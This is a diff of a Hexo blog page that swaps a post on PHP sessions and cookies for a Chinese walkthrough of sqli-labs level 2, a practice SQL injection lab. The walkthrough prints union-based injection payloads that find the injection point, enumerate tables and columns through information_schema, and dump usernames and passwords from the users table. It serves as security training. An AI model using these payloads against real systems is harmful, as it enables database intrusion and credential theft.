@@ -10,7 +10,7 @@
     
     
     
-    <title>Session_control | Hexo</title>
+    <title>sqli-labs_2 | Hexo</title>
     <link href="http://example.com" rel="prefetch" />
 
     
@@ -156,19 +156,19 @@
         <i class="fa fa-home"></i>
         <a href="http://example.com">Hexo</a>
         >
-        <span>Session_control</span>
+        <span>sqli-labs_2</span>
     </div>
     <!-- 大型设备详细文章 -->
     <div class="hidden-xs">
         <div class="title-article">
             <h1>
-                <a href="/2022/03/14/Session-control/">Session_control</a>
+                <a href="/2022/03/23/sqli-labs-2/">sqli-labs_2</a>
             </h1>
         </div>
         <div class="tag-article">
             
             <span class="label label-gal">
-                <i class="fa fa-calendar"></i> 2022-03-14
+                <i class="fa fa-calendar"></i> 2022-03-23
             </span>
             
         </div>
@@ -178,11 +178,11 @@
         <center>
             <div class="title-article">
                 <h4>
-                    <a href="/2022/03/14/Session-control/">Session_control</a>
+                    <a href="/2022/03/23/sqli-labs-2/">sqli-labs_2</a>
                 </h4>
             </div>
             <p>
-                <i class="fa fa-calendar"></i> 2022-03-14
+                <i class="fa fa-calendar"></i> 2022-03-23
             </p>
             <p>
                 
@@ -191,17 +191,56 @@
         </center>
     </div>
     <div class="content-article">
-        <h1 id="PHP会话控制"><a href="#PHP会话控制" class="headerlink" title="PHP会话控制"></a>PHP会话控制</h1><p><img src="/Session-control/image-20220314164011263.png" alt="image-20220314164011263"></p>
-<p><img src="/Session-control/image-20220314165321940.png" alt="image-20220314165321940"></p>
-<p><img src="/Session-control/image-20220314165436306.png" alt="image-20220314165436306"></p>
-<h2 id="Cookies"><a href="#Cookies" class="headerlink" title="Cookies"></a>Cookies</h2><p><img src="/Session-control/image-20220314170434761.png" alt="image-20220314170434761"></p>
-<p><img src="/Session-control/image-20220315080643492.png" alt="image-20220315080643492"></p>
-<p><img src="/Session-control/image-20220315080907882.png" alt="image-20220315080907882"></p>
-<p><img src="/Session-control/image-20220315081515671.png" alt="image-20220315081515671"></p>
-<p><img src="/Session-control/image-20220315085304678.png" alt="image-20220315085304678"></p>
-<p><img src="/Session-control/image-20220315090020261.png" alt="image-20220315090020261"></p>
-<p><img src="/Session-control/image-20220315090355495.png" alt="image-20220315090355495"></p>
-<p><a target="_blank" rel="noopener" href="https://juejin.cn/post/6898630134530752520">前端鉴权的兄弟们：cookie、session、token、jwt、单点登录 - 掘金 (juejin.cn)</a></p>
+        <h1 id="sql-labs-t2"><a href="#sql-labs-t2" class="headerlink" title="sql-labs-t2"></a>sql-labs-t2</h1><p><strong>注：同t1思路完全相同，仅注入点不同。可以不看此题解</strong></p>
+<h3 id="一、观察题目"><a href="#一、观察题目" class="headerlink" title="一、观察题目"></a>一、观察题目</h3><p>同t1的提示，提交id&#x3D;1进行尝试</p>
+<p><img src="/sqli-labs-2/image-20220323170558808.png" alt="image-20220323170558808"></p>
+<p>同t1思路，尝试寻找注入点</p>
+<h3 id="二、寻找注入点"><a href="#二、寻找注入点" class="headerlink" title="二、寻找注入点"></a>二、寻找注入点</h3><p>提交</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and 1=1 --+</span><br></pre></td></tr></table></figure>
+
+<p>发现提示信息有and 1&#x3D;1 –  ，因此尝试推测为整形注入点</p>
+<p><img src="/sqli-labs-2/image-20220323170747547.png" alt="image-20220323170747547"></p>
+<p>进行尝试，提交</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=1 and 1=1 --+</span><br><span class="line">id=1 and 1=2 --+</span><br></pre></td></tr></table></figure>
+
+<p>发现存在注入点</p>
+<p><img src="/sqli-labs-2/image-20220323171023641.png" alt="image-20220323171023641"></p>
+<p><img src="/sqli-labs-2/image-20220323171059800.png" alt="image-20220323171059800"></p>
+<h3 id="三、查找表的结构"><a href="#三、查找表的结构" class="headerlink" title="三、查找表的结构"></a>三、查找表的结构</h3><p>同t1，先对表单属性个数进行测试</p>
+<p>提交</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 order by [num]--+</span><br></pre></td></tr></table></figure>
+
+<p>同样到4时进行报错，推测有三个元素</p>
+<p><img src="/sqli-labs-2/image-20220323171543166.png" alt="image-20220323171543166"></p>
+<p>对输出进行测试</p>
+<p>提交</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,2,3--+</span><br></pre></td></tr></table></figure>
+
+<p>得出输出样式，同样是2，3位置可以输出。</p>
+<p><img src="/sqli-labs-2/image-20220323171639418.png" alt="image-20220323171639418"></p>
+<p>获取数据库信息</p>
+<p>提交</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,group_concat(database()),3--+</span><br></pre></td></tr></table></figure>
+
+<p>可知此数据库为security</p>
+<p><img src="/sqli-labs-2/image-20220323171825578.png" alt="image-20220323171825578"></p>
+<p>之后在information_schema表中查找数据库表信息</p>
+<p>提交</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br></pre></td></tr></table></figure>
+
+<p>找到数据库表名信息</p>
+<p><img src="/sqli-labs-2/image-20220323174930569.png" alt="image-20220323174930569"></p>
+<p>根据表名查询表内属性</p>
+<p>提交</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure>
+
+<p>获得属性名称</p>
+<p><img src="/sqli-labs-2/image-20220323175456459.png" alt="image-20220323175456459"></p>
+<p>对信息查询</p>
+<p>提交</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,group_concat(username,&#x27;:&#x27;,password),3 from users --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/sqli-labs-2/image-20220323180226570.png" alt="image-20220323180226570"></p>
 
     </div>
 </article>
@@ -263,31 +302,13 @@
             
             <li class="list-group-item">
                 <span class="post-title">
+                    <a href="/2022/03/23/sqli-labs-2/">sqli-labs_2</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
                     <a href="/2022/03/15/Database/">Database</a>
-                </span>
-            </li>
-            
-            <li class="list-group-item">
-                <span class="post-title">
-                    <a href="/2022/03/14/Session-control/">Session_control</a>
-                </span>
-            </li>
-            
-            <li class="list-group-item">
-                <span class="post-title">
-                    <a href="/2022/03/14/PHP-base/">PHP_base</a>
-                </span>
-            </li>
-            
-            <li class="list-group-item">
-                <span class="post-title">
-                    <a href="/2022/03/12/JavaScript/">JavaScript</a>
-                </span>
-            </li>
-            
-            <li class="list-group-item">
-                <span class="post-title">
-                    <a href="/2022/03/07/hello-world/">Hello World</a>
                 </span>
             </li>
             
@@ -309,31 +330,13 @@
             
             <li class="list-group-item">
                 <span class="post-title">
-                    <a href="/2022/03/07/hello-world/">Hello World</a>
-                </span>
-            </li>
-            
-            <li class="list-group-item">
-                <span class="post-title">
-                    <a href="/2022/03/12/JavaScript/">JavaScript</a>
-                </span>
-            </li>
-            
-            <li class="list-group-item">
-                <span class="post-title">
                     <a href="/2022/03/15/Database/">Database</a>
                 </span>
             </li>
             
             <li class="list-group-item">
                 <span class="post-title">
-                    <a href="/2022/03/14/PHP-base/">PHP_base</a>
-                </span>
-            </li>
-            
-            <li class="list-group-item">
-                <span class="post-title">
-                    <a href="/2022/03/14/Session-control/">Session_control</a>
+                    <a href="/2022/03/23/sqli-labs-2/">sqli-labs_2</a>
                 </span>
             </li>
             
@@ -348,17 +351,17 @@
 
                 
                 <li>
-                    <a href="/2022/03/14/Session-control/index.html#sidebar-tags" data-toggle="tab" id="tags-tab">热门标签</a>
+                    <a href="/2022/03/23/sqli-labs-2/index.html#sidebar-tags" data-toggle="tab" id="tags-tab">热门标签</a>
                 </li>
                 
                 
                 <li>
-                    <a href="/2022/03/14/Session-control/index.html#sidebar-friend-links" data-toggle="tab" id="friend-links-tab">友情链接</a>
+                    <a href="/2022/03/23/sqli-labs-2/index.html#sidebar-friend-links" data-toggle="tab" id="friend-links-tab">友情链接</a>
                 </li>
                 
                 
                 <li>
-                    <a href="/2022/03/14/Session-control/index.html#sidebar-links" data-toggle="tab" id="links-tab">个人链接</a>
+                    <a href="/2022/03/23/sqli-labs-2/index.html#sidebar-links" data-toggle="tab" id="links-tab">个人链接</a>
                 </li>
                 
             </ul>
